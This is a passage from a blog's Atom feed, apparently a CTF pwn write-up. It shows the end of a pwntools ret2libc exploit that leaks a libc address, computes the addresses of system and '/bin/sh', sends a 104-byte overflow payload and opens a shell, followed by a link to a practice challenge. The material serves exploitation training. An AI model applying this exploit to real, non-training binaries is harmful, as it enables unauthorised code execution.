related addr&#34;&lt;/span&gt;&lt;br&gt;libc_start_main_addr = u32(sh.recv()[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;])&lt;br&gt;libc = LibcSearcher(&lt;span class=&#34;hljs-string&#34;&gt;&#39;__libc_start_main&#39;&lt;/span&gt;, libc_start_main_addr)&lt;br&gt;libcbase = libc_start_main_addr - libc.&lt;span class=&#34;hljs-keyword&#34;&gt;dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;__libc_start_main&#39;&lt;/span&gt;)&lt;br&gt;system_addr = libcbase + libc.&lt;span class=&#34;hljs-keyword&#34;&gt;dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;system&#39;&lt;/span&gt;)&lt;br&gt;binsh_addr = libcbase + libc.&lt;span class=&#34;hljs-keyword&#34;&gt;dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;str_bin_sh&#39;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;get shell&#34;&lt;/span&gt;&lt;br&gt;payload = flat([&lt;span class=&#34;hljs-string&#34;&gt;&#39;A&#39;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;104&lt;/span&gt;, system_addr, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef, binsh_addr])&lt;br&gt;sh.sendline(payload)&lt;br&gt;&lt;br&gt;sh.interactive()&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;题目-¶-2&#34;&gt;&lt;a href=&#34;#题目-¶-2&#34; class=&#34;headerlink&#34; title=&#34;题目 ¶&#34;&gt;&lt;/a&gt;题目 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;train.cs.nctu.edu.tw: ret2libc&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="pwn" />
        <updated>2023-04-26T03:17:43.000Z</updated>
    </entry>
</feed>
